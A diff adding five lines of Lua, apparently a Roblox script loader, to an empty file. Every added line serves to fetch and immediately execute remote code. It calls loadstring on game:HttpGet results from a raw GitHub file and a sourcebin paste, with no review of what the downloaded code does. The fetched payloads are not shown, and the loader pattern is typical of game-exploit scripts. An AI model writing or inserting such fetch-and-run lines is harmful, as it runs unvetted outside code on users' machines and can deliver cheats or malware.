@@ -1,1 +1,5 @@
-
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/dip/refs/heads/main/most.lua"))()
+end)
+task.wait(0.2)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NmdEkfTeAx/0"))()
